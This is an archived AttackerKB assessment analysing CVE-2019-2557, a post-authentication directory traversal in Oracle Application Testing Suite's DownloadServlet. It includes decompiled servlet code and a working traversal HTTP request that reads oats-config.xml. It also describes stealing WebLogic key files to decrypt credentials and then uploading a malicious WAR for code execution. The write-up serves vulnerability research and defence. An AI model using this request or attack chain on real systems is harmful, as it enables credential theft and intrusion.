---
title: Oracle Application Testing Suite DownloadServlet Directory Traversal Remote Code Execution
author: wchen-r7
score: 1
topic_attacker_value: 5
topic_exploitability: 3
topic_disclosure_date: '2019-04-23T19:32:00'
created: '2019-05-09T17:57:33.370473'
revision_date: '2020-03-15T04:22:22.595044'
assessment_id: e77b54e1-9402-420f-9c55-ae7b2acc8669
topic_id: 1e11c24b-3fb2-4a58-8627-45a7c62a9221
topic_short_id: AWDqgA1p8X
topic_slug: oracle-application-testing-suite-downloadservlet-directory-traversal-remote-code-execution
akb_topic_url: https://attackerkb.com/topics/AWDqgA1p8X/oracle-application-testing-suite-downloadservlet-directory-traversal-remote-code-execution
akb_assessment_url: https://attackerkb.com/topics/AWDqgA1p8X/oracle-application-testing-suite-downloadservlet-directory-traversal-remote-code-execution#e77b54e1-9402-420f-9c55-ae7b2acc8669
author_ratings:
  attacker-value: 5
  confidence-in-ratings: 5
  effort-to-develop-exploit: 3
  exploitability: 3
  urgent-to-patch: 5
  used-successfully: 5
---

# Oracle Application Testing Suite DownloadServlet Directory Traversal Remote Code Execution

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/AWDqgA1p8X/oracle-application-testing-suite-downloadservlet-directory-traversal-remote-code-execution#e77b54e1-9402-420f-9c55-ae7b2acc8669).*

---

## Background

Oracle Application Testing Suite (OATS) is a comprehensive, integrated testing solution for web applications, web services, packaged Oracle applications, and Oracle databases. OATS is part of an application deployed in the WebLogic service on port 8088, which also includes these tools: Administrator, OpenScript, Oracle Load Testing, and Oracle Test Manager.

In the Load Testing component, a vulnerability was discovered by Steven Seeley ([@mr_me](<https://twitter.com/steventseeley>)) of [Source Incite](<https://srcincite.io/>) in the DownloadServlet class. According to the Source Incite [advisory](<https://srcincite.io/advisories/src-2019-0033/>), the issue results from the lack of proper validation of a user-supplied string before using it to read a file. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Note that authentication is required.

This vulnerability is also known as CVE-2019-2557.

## Vulnerable Setup

The following is the exact setup I used to test and analyze the vulnerability:

* Windows Server 2008 R2 x64 (other Windows systems are also supported)
  * .Net Framework 3.5 enabled (from add/remove features)
  * IE ESC (from Server Manager) disabled
  * 8GB of RAM (at least more than 4GB will be used to run OATS)
  * Duel-Core processor
* [oats-win64-full-13.3.0.1.262.zip](https://download.oracle.com/otn/nt/apptesting/13.3.0.1/oats-win64-full-13.3.0.1.262.zip?AuthParam=1556777168_2adf60d3eeef4dd1b101c27e10687ee4) (x86 did not work for me)
* [Jdk-7u21-windows-x64.exe](https://download.oracle.com/otn/java/jdk/7u21-b11/jdk-7u21-windows-x64.exe?AuthParam=1556774666_2bb4d38d69aa5fca7e877b62030680a1)
* [OracleXE112_Win64.zip](https://download.oracle.com/otn/nt/oracle11g/xe/OracleXE112_Win64.zip?AuthParam=1556742235_240fcb1f3d65a474b8bc52709006e3d4) (Newer version 18c did not work well for me)
* [Firefox](https://download-installer.cdn.mozilla.net/pub/firefox/releases/66.0.3/win64/en-US/Firefox%20Setup%2066.0.3.exe) (I had to install this because IE on Win2k8 is completely outdated)
* Adobe Flash installed (IE ESC needs to be disabled in order to install this)

For installation instructions, please refer to the [Oracle Application Testing Suite Installation Guide](<https://docs.oracle.com/cd/E75776_01/doc.1250/e55188/toc.htm>).

## Vulnerability Analysis

### Post Authentication

Initially, one thing that stands out a lot from the description of the advisory is that the vulnerability requires authentication. Although there are two built-in accounts for OATS (default and administrator), their passwords are manaully configured during installation, which makes the attack a bit harder to suceeed. This means that a good password policy could actually prevent CVE-2019-2557, and probably other similiar post-auth attacks.

### Finding DownloadServlet

Although public information is very limited regarding the vulnerability, the advisory from Source Incite actually has enough technical details allowing us to investigate. One of those important clues is the fact the vulnerability comes from **DownloadServlet**, so this is the first thing we're looking for in the file system.

A common approach to find something in the file system is either by using the `grep` or `find` command. Windows doesn't have these commands, so [CygWin](<https://www.cygwin.com/>) was installed in my setup to help with debugging.

Using the `find` command from CygWin, I was able to locate DownloadServlet quickly:

```
Administrator@WIN-RJT50G3P0QS /cygdrive/c/OracleATS
$ find . -name *DownloadServlet*
./oats/servers/AdminServer/tmp/_WL_user/oats_ee/1ryhnd/war/oracle/oats/olt/web/DownloadServlet.class
```

Having that class file, we can easily decompile it with jd-gui (a Java decompiler), and get the source code. The `doGet` function is particularly interesting for us:

```java
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws ServletException, IOException
  {
    User user = (User)request.getSession().getAttribute("CurrentUser");
    if (user == null) {
      throw new ServletException("Unauthorized session.");
    }
    String type = request.getParameter("type");

    byte[] content = null;
    String contentMimeType = null;
    String contentDisposition = null;
    if (type.equalsIgnoreCase("vulog"))
    {
      long id = Long.parseLong(request.getParameter("id"));
      Vulog log = this.vuLogService.getLog(id);
      if (log != null)
      {
        content = log.getLogcontent();
        contentMimeType = log.getContentmimetype();
        if ((content != null) && (contentMimeType != null))
        {
          if (contentMimeType.equalsIgnoreCase("text/html")) {
            content = HtmlModifier.massageRenderedData(content, "UTF8");
          }
          if (!contentMimeType.contains("charset")) {
            contentMimeType = contentMimeType + "; charset=utf-8";
          }
        }
      }
    }
    else if (type.equalsIgnoreCase("template"))
    {
      String name = request.getParameter("name");
      String session = request.getParameter("session");
      String s = request.getParameter("think");
      boolean useThinkTimes = false;
      if (s != null) {
        useThinkTimes = Boolean.parseBoolean(s);
      }
      try
      {
        if ((name != null) && (!name.isEmpty()))
        {
          String template = this.reportQueriesManager.getTemplate(name);
          if ((template != null) && (session != null))
          {
            content = processTemplate(name, template, session, useThinkTimes, request.getLocale());
            contentMimeType = determineContentType(name);

            contentDisposition = !contentMimeType.startsWith("text") ? "attachment; filename=" + name : null;
          }
        }
      }
      catch (SettingsException e)
      {
        e.printStackTrace();
      }
    }
    if ((content == null) || (contentMimeType == null))
    {
      content = "No content to display.".getBytes("UTF8");
      contentMimeType = "text/plain; charset=utf-8";
    }
    response.setContentType(contentMimeType);
    response.setContentLength(content.length);
    if (contentDisposition != null) {
      response.addHeader("Content-Disposition", contentDisposition);
    }
    OutputStream os = response.getOutputStream();
    os.write(content);
    os.flush();
  }
```

### Clues to Triggering DownloadServlet

At this point, the DownloadServerlet class is found, and we need to figure out what is using that, and trace our way back to where user inputs could occur. Since this is a Java web application, there should be a file that provides some kind of mappning information. Looking around, I found:

```
C:\OracleATS\oats\servers\AdminServer\tmp\_WL_user\oats_ee\1ryhnd\war\WEB-INF\web.xml
```

 Which tells us our DownloadServlet class is mapped to `/download`:

```xml
<servlet>
<description></description>
<display-name>Download Servlet</display-name>
<servlet-name>file-download</servlet-name>
<servlet-class>oracle.oats.olt.web.DownloadServlet</servlet-class>
<run-as>
<role-name>oats</role-name>
</run-as>
</servlet>
<servlet-mapping>
<servlet-name>file-download</servlet-name>
<url-pattern>/download</url-pattern>
</servlet-mapping>
```

Now that I know in order to trigger DownloadServlet, I need to go to the `download` path. But we also need to know how this resource is used by the application normally, so we need an example. Grepping for the `download` string and the keyword `template`, I found:

```
Administrator@WIN-RJT50G3P0QS /cygdrive/c/OracleATS/oats/servers/AdminServer/tmp/_WL_user/oats_ee
$ grep -iR "/download" * |grep -i template
Binary file 1ryhnd/jsp_servlet/_pages/_session/__customtemplate_jsff.class matches
1ryhnd/war/pages/session/customTemplate.jsff:                   source="/download?type=template&amp;session=#{reportBean.session}&amp;name=#{queryManagerBean.selectedTemplate}">
```

This seems to tell us at least two things. One is how a normal request should look like; the parameters used here confirm the Java code we are looking at. The second is that it appears the `download` resource is used by something related to custom templates, and the name is parameter is something selectable.

Note that iIn the DownloadServlet code, the `name` parameter is passed to a `getTemplate` function:

```java
String template = this.reportQueriesManager.getTemplate(name);
```

The next thing we want to do is how to get to custom templates from the user's perspective. It looks like in the Load Testing interface, there is a Reports tab, and in there, we can see a "Custom Reports" tab on the left. On this page, you can choose what template to view. If you use the Developers tool to inspect the network traffic for viewing a template, you can see this URL being requested:

```
http://localhost:8088/olt/download?type=template&session=LoadTest500VU_Build1&name=SampleTemplate.htm
```

And that is the HTTP request we should be sending to trigger DownloadServlet.

### Verifying the Trigger by Remote Debugging

Up until this point, all our analysis were based on source code review. However, sometimes mistakes can happen by reviewing code, so we need another way to be sure that we are on the right track. Generally speaking, I would either try adding a breakpoint somehow, or print something in log or on screen if I have control over the source code. Since we have compiled code, we can't really do the second, so we need a way to add a breakpoint.

Googling around, I found a way to remote-debug WebLogic, and turns out it's quite simple according to Oracle's documentation titled [Remote Debugging an EJB on WebLogic Server](<https://www.oracle.com/technetwork/developer-tools/jdev/remotedebugwls-086628.html>). The write-up is rather long for what we need, but basically, you want to open this file:

```
C:\OracleATS\oats\bin\startWebLogic.cmd
```

And add this line as the first java options:

```
set JAVA_OPTIONS=-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=4000,server=y,suspend=n
```

Next, go to Control Panel -> Services to stop Oracle ATS Server (this is the WebLogic service). After that, open a command prompt, and run the startWebLogic.cmd script. It will probably take a few minutes to get going, but you will see two ports:

* Port 4000 : The port you need for remote debugging.
* Port 8088: The port for OATS.

Using IntelliJ (a popular JAVA IDE), we can use it to remotely debug WebLogic. First, make sure to connect to port 4000 to the target Windows machine, and then add a breakpoint for:

```
oracle.oats.olt.web.DownloadServlet.doGet
```

Note:

* `oracle.oats.olt.web` is the package name.
* `DownloadServlet` is the class name.
* `doGet` is the method name.

The breakpoint should trigger by selecting a custom template in Oracle Load Testing, and then give us a callstack that shoud look similar to this:

```
doGet:59, DownloadServlet (oracle.oats.olt.web)
service:731, HttpServlet (javax.servlet.http)
service:844, HttpServlet (javax.servlet.http)
run:280, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
run:254, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:120, SecurityManager (weblogic.security.service)
run:57, WlsSubjectHandle (weblogic.servlet.provider)
invokeServlet:134, StubSecurityHelper (weblogic.servlet.internal)
execute:346, ServletStubImpl (weblogic.servlet.internal)
doFilter:25, TailFilter (weblogic.servlet.internal)
doFilter:79, FilterChainImpl (weblogic.servlet.internal)
run:137, JpsAbsFilter$1 (oracle.security.jps.ee.http)
doPrivileged:-1, AccessController (java.security)
doAsPrivileged:315, JpsSubject (oracle.security.jps.util)
runJaasMode:460, JpsPlatformUtil (oracle.security.jps.ee.util)
runJaasMode:120, JpsAbsFilter (oracle.security.jps.ee.http)
doFilter:217, JpsAbsFilter (oracle.security.jps.ee.http)
doFilter:81, JpsFilter (oracle.security.jps.ee.http)
doFilter:79, FilterChainImpl (weblogic.servlet.internal)
doFilter:220, DMSServletFilter (oracle.dms.servlet)
doFilter:79, FilterChainImpl (weblogic.servlet.internal)
doFilter:27, RequestEventsFilter (weblogic.servlet.internal)
doFilter:79, FilterChainImpl (weblogic.servlet.internal)
wrapRun:3436, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
run:3402, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:120, SecurityManager (weblogic.security.service)
run:57, WlsSubjectHandle (weblogic.servlet.provider)
doSecuredExecute:2285, WebAppServletContext (weblogic.servlet.internal)
securedExecute:2201, WebAppServletContext (weblogic.servlet.internal)
execute:2179, WebAppServletContext (weblogic.servlet.internal)
run:1572, ServletRequestImpl (weblogic.servlet.internal)
run:255, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
execute:311, ExecuteThread (weblogic.work)
run:263, ExecuteThread (weblogic.work)
```

When the breakpoint is hit, another thing I did was running Process Monitor (a tool in SysInternals) to see the exact file path being accessed. By setting a filter for path `SampleTemplate.htm`, which is what comes with the default installation, this path reveals:

```
C:\OracleATS\config\Report Templates\SampleTemplate.htm
```

Since we have control of the filename (because it comes from the `name` parameter in the GET request), that means the directory traversal starts off in the `Reports Templates` directory.

### Modifying the HTTP Request

The next thing we want to verify is actually modify the HTTP request and attempt the directory traversal, and we do this with Burp Suite:

```
GET /olt/download?type=template&session=LoadTest500VU_Build1&name=..\oats-config.xml HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8088/olt/faces/mainFlow/landing?_afrLoop=115267259422500&_afrWindowMode=0&Adf-Window-Id=w0&_afrPage=1
Connection: close
Cookie: JSESSIONID=IZt8Xq7BOogZ5mnypzRBEkwK_0mJjSm4FRk0LMo-qYHPdo5NajcQ!1445438826
Upgrade-Insecure-Requests: 1
```

By changing the `name` parameter to an existing file in Oracle (which is located in `C:\OracleATS\config`), the web server returns the following HTTP response:

```
HTTP/1.1 200 OK
Connection: close
Date: Fri, 03 May 2019 19:02:24 GMT
Content-Length: 1024
Content-Type: text/html; charset=utf-8
X-ORACLE-DMS-ECID: 3ed7b897-c0f1-4c19-b882-f7a80a432216-0000035d

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
<entry key="oracle.oats.cluster.agent.username">oats-agent</entry>
<entry key="oracle.oats.security.keystore.info">eYAdfLaDkdBlUmflYhpg+CHGeXc=</entry>
<entry key="oracle.oats.cluster.username">oats</entry>
<entry key="oracle.oats.cluster.agent.password">{AES}WNdIPXpoeoZzyDNuJPm0wU4R3YKc1SUR2k5+TbQfzIQ=</entry>
<entry key="oracle.oats.admin.username">oats</entry>
<entry key="oracle.oats.http.url">http://localhost:8088</entry>
<entry key="oracle.oats.config.version">9.1.0</entry>
<entry key="oracle.oats.admin.password">{AES}NHrwlbPc7Arlb7puj+UlzAAXB/dUEbv3bdwNnee1/sc=</entry>
<entry key="oracle.oats.cluster.password">{AES}WMTjMmLChdB9CTSrnyJ33113u0ml0juuGZQCWPODJTk=</entry>
<entry key="oracle.oats.admin.url">t3://localhost:8088</entry>
<entry key="oracle.oats.tmp.dir">/tmp</entry>
<entry key="oracle.oats.cluster.url">t3://localhost:8088</entry>
</properties>
```

We got the the username, password, the cluster password, etc. Looks like the attack worked.

### Remote Code Execution

If a directory traversal vulneraebility can turn into a remote code execution, that probably means there is something on the file system that is worth stealing, which could help us to get code execution.

One of those examples is Ruby on Rails. Rails applications are extra sensitive to directory traversal attacks, because their encryption keys (secret.yml or credentials.yml.enc with master.key) are in the same directory as the application. An attacker could steal those and create a signed serialized payload, and end up getting remote code execution.

Our attack vector for Oracle Application Testing Suite is similar to that scenario. The catch is that all the credentials in OATS are actually encrypted with AES, so in order to get code execution, we need to find a way to decrypt that. To do this, I found this reference: [Decrypting WebLogic Passwords](<https://blog.netspi.com/decrypting-weblogic-passwords/>) by Eric Gruber.

Basically, you need to steal two files for the decryption:

* C:\OracleATS\oats\servers\AdminServer\security\SerializedSystemIni.dat
* C:\OracleATS\oats\servers\AdminServer\security\boot.properties

After confirming with mr_me about this, we know that once the credentials are decrypted, we actually have multiple ways to get in. However, it seems in order to decrypt the credentials, Ruby doesn't have the most suitable crypto library for the task, therefore most publicly available scripts rely on Java's Bouncy Castle. Because of that, there isn't a Metasploit exploit module for now, but as an attacker you can steal these files first, use a public script to decrypt, and then move on to one of the following methods to gain remote code execution.

### The Oracle Console

An administrator console is actually available in the OATS interface, which can be found at:

```
http://[host]:8088/console
```

The username/password found in boot.properties can be used to log into the console, and then upload a malicious WAR to get remote code exectuion.

### The Oracle Database

Another thing we could steal is the olt-database-config.xml, which gives you access to the Oracle database on port 1521.
